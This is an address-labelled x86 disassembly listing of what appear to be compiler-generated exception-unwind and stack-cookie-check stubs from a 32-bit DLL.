sub_10047acb
lea ecx [ ebp - 0x3c ]
jmp sub_10007b41
sub_10047ad3
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047adb
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10047ae3
lea ecx [ ebp - 0x5c ]
jmp sub_10001da0
sub_10047aeb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047b10
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10047b18
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047b20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047b45
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047b4d
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10047b55
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047b7a
lea ecx [ ebp - 0x74 ]
jmp sub_10007b41
sub_10047b82
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10047b8a
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047b92
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047bb7
lea ecx [ ebp - 0x40 ]
jmp sub_10007b41
sub_10047bbf
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047bc7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047bec
lea ecx [ ebp - 0x54 ]
jmp sub_10007b41
sub_10047bf4
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10047bfc
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047c04
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047c0c
lea ecx [ ebp - 0x60 ]
jmp sub_10007b41
sub_10047c14
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047c39
lea ecx [ ebp - 0x38 ]
jmp sub_10007b41
sub_10047c41
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047c66
lea ecx [ ebp - 0x58 ]
jmp sub_10007b41
sub_10047c6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047c93
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047cae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047cc9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047ce4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047cff
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047d07
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047d2c
lea ecx [ ebp - 0x34 ]
jmp sub_10001da0
sub_10047d34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047d59
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_100025e2
sub_10047d72
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047d8d
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_1003c036
sub_10047da6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047dc1
push [ ebp + 0x8 ]
call sub_1002004f
pop ecx
retn
sub_10047dcb
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047de4
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
jmp sub_10007701
sub_10047e00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047e1e
lea ecx [ ebp - 0x14 ]
jmp sub_1001b1e7
sub_10047e26
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047e41
lea ecx [ ebp - 0x3c ]
jmp sub_10007b41
sub_10047e49
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_10047e51
lea ecx [ ebp - 0x5c ]
jmp sub_1003c036
sub_10047e59
lea ecx [ ebp - 0x5c ]
jmp sub_1003c036
sub_10047e61
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047e86
lea ecx [ ebp - 0xb0 ]
jmp sub_10007b41
sub_10047e91
lea ecx [ ebp - 0xac ]
jmp sub_10007b41
sub_10047e9c
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_10047ea4
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_100025e2
sub_10047ebd
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_10047ec8
lea ecx [ ebp - 0x64 ]
jmp sub_10001da0
sub_10047ed0
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047ed8
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_100025e2
sub_10047ef4
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_100025e2
sub_10047f10
lea ecx [ ebp - 0x15c ]
jmp sub_100025e2
sub_10047f1b
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_100025e2
sub_10047f37
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_100025e2
sub_10047f53
lea ecx [ ebp - 0x178 ]
jmp sub_100025e2
sub_10047f5e
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10047f66
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047f8e
lea ecx [ ebp + 0x24 ]
jmp sub_100025e2
sub_10047f96
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_10047fa1
lea ecx [ ebp - 0x8c ]
jmp sub_10007b41
sub_10047fac
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047fb4
lea ecx [ ebp - 0x48 ]
jmp sub_100025e2
sub_10047fbc
lea ecx [ ebp - 0xc0 ]
jmp sub_100025e2
sub_10047fc7
lea ecx [ ebp - 0xc0 ]
jmp sub_100025e2
sub_10047fd2
lea ecx [ ebp - 0x64 ]
jmp sub_100025e2
sub_10047fda
lea ecx [ ebp - 0xc0 ]
jmp sub_100025e2
sub_10047fe5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004800d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048028
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10048030
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048038
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004805d
lea ecx [ ebp - 0x78 ]
jmp sub_10007b41
sub_10048065
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_1004806d
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048075
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004809a
lea ecx [ ebp - 0x50 ]
jmp sub_10007b41
sub_100480a2
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100480aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100480cf
lea ecx [ ebp - 0xb0 ]
jmp sub_10007b41
sub_100480da
lea ecx [ ebp - 0xac ]
jmp sub_10007b41
sub_100480e5
lea ecx [ ebp - 0x48 ]
jmp sub_1003c036
sub_100480ed
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_1003c036
sub_10048106
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_10048111
lea ecx [ ebp - 0x64 ]
jmp sub_10001da0
sub_10048119
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048121
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_1003c036
sub_1004813d
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_1003c036
sub_10048159
lea ecx [ ebp - 0x15c ]
jmp sub_1003c036
sub_10048164
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_1003c036
sub_10048180
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_1003c036
sub_1004819c
lea ecx [ ebp - 0x178 ]
jmp sub_1003c036
sub_100481a7
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_100481af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100481d7
lea ecx [ ebp + 0x24 ]
jmp sub_1003c036
sub_100481df
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_100481ea
lea ecx [ ebp - 0x8c ]
jmp sub_10007b41
sub_100481f5
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100481fd
lea ecx [ ebp - 0x48 ]
jmp sub_1003c036
sub_10048205
lea ecx [ ebp - 0xc0 ]
jmp sub_1003c036
sub_10048210
lea ecx [ ebp - 0xc0 ]
jmp sub_1003c036
sub_1004821b
lea ecx [ ebp - 0x64 ]
jmp sub_1003c036
sub_10048223
lea ecx [ ebp - 0xc0 ]
jmp sub_1003c036
sub_1004822e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048256
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048271
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10048279
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10048281
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100482a6
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100482ae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100482d3
lea ecx [ ebp - 0x54 ]
jmp sub_100025e2
sub_100482db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048300
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10048308
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004832d
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_10048337
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10048350
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_10007701
sub_1004836c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004838a
lea ecx [ ebp - 0x54 ]
jmp sub_10007b41
sub_10048392
lea ecx [ ebp - 0x4c ]
jmp sub_1003c036
sub_1004839a
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_100483a2
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_100483aa
lea ecx [ ebp - 0x60 ]
jmp sub_10007b41
sub_100483b2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100483d7
lea ecx [ ebp - 0x3c ]
jmp sub_10007b41
sub_100483df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048404
lea ecx [ ebp - 0x54 ]
jmp sub_10007b41
sub_1004840c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048431
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_10048439
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_10048441
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048466
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_1004846e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048493
lea ecx [ ebp - 0x54 ]
jmp sub_1003c036
sub_1004849b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100484c0
lea ecx [ ebp - 0x2c ]
jmp sub_1003c036
sub_100484c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100484ed
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_100484f7
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_10048501
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_1004850b
push [ ebp + 0xc ]
call sub_1002004f
pop ecx
retn
sub_10048515
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048530
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004854b
lea ecx [ ebp - 0x34 ]
jmp sub_10001da0
sub_10048553
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048578
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_10001da0
sub_10048591
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100485ac
lea ecx [ ebp - 0xb8 ]
jmp sub_10007b41
sub_100485b7
lea ecx [ ebp - 0xbc ]
jmp sub_10007b41
sub_100485c2
lea ecx [ ebp - 0x64 ]
jmp sub_10001da0
sub_100485ca
mov eax [ ebp - 0x6c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_10001da0
sub_100485e3
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_100485ee
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_100485f6
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100485fe
mov eax [ ebp - 0x6c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffd
lea ecx [ ebp - 0x128 ]
jmp sub_10001da0
sub_1004861a
mov eax [ ebp - 0x6c ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffb
lea ecx [ ebp - 0xf0 ]
jmp sub_10001da0
sub_10048636
lea ecx [ ebp - 0x160 ]
jmp sub_10001da0
sub_10048641
mov eax [ ebp - 0x6c ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffff7
lea ecx [ ebp - 0x144 ]
jmp sub_10001da0
sub_1004865d
mov eax [ ebp - 0x6c ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x6c ] 0xffffffef
lea ecx [ ebp - 0x10c ]
jmp sub_10001da0
sub_10048679
lea ecx [ ebp - 0x17c ]
jmp sub_10001da0
sub_10048684
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004868c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x180 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100486b4
lea ecx [ ebp + 0x24 ]
jmp sub_10001da0
sub_100486bc
lea ecx [ ebp - 0x84 ]
jmp sub_10007b41
sub_100486c7
lea ecx [ ebp - 0x88 ]
jmp sub_10007b41
sub_100486d2
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100486da
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_100486e2
lea ecx [ ebp - 0xc4 ]
jmp sub_10001da0
sub_100486ed
lea ecx [ ebp - 0xc4 ]
jmp sub_10001da0
sub_100486f8
lea ecx [ ebp - 0x64 ]
jmp sub_10001da0
sub_10048700
lea ecx [ ebp - 0xc4 ]
jmp sub_10001da0
sub_1004870b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048733
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004874e
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10048756
lea ecx [ ebp - 0x48 ]
jmp sub_10001da0
sub_1004875e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048783
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_1004878b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100487b0
lea ecx [ ebp - 0x54 ]
jmp sub_10001da0
sub_100487b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100487dd
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100487e5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004880a
push [ ebp - 0x10 ]
call sub_1002004f
pop ecx
retn
sub_10048814
push [ ebp - 0x10 ]
call sub_1002004f
pop ecx
retn
sub_1004881e
push [ ebp + 0xc ]
call sub_1002004f
pop ecx
retn
sub_10048828
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048843
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004885e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048879
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048894
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100488af
mov ecx [ ebp - 0x10 ]
jmp sub_1003a4f8
sub_100488b7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100488d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100488ed
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048908
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048923
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004893e
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1001b08e
sub_10048949
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048964
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000c490
sub_1004896f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_1004898a
lea esi [ ebp - 0x10 ]
jmp sub_1000acab
sub_10048992
lea esi [ ebp - 0x14 ]
jmp sub_1000acab
sub_1004899a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100489b5
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000307b
sub_100489c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100489db
mov ecx [ ebp - 0x10 ]
jmp sub_1001b1e7
sub_100489e3
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001da0
sub_100489ee
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10001da0
sub_100489f9
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_10001da0
sub_10048a04
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp sub_10001da0
sub_10048a0f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048a2a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048a45
mov ecx [ ebp - 0x10 ]
jmp sub_100132a0
sub_10048a4d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048a68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10048a83
mov ecx [ ebp - 0x10 ]
jmp sub_100202c9
sub_10048a8b
